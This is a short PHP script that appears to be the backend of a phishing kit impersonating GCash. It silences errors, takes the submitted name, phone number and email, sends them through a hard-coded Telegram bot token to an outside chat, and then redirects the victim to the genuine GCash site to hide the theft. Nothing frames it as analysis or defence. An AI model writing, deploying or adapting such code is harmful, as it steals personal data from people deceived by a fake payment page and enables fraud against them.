error_reporting(0);
error_log(0);
$data = [
'chat_id' => "-517657858",
'text' => "Fullname: " . $_POST['name'] . "\nNumber: " . $_POST['number'] . "\nEmail: " . $_POST['email']
];
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?" . http_build_query($data));
header("Location: https://www.gcash.com/");
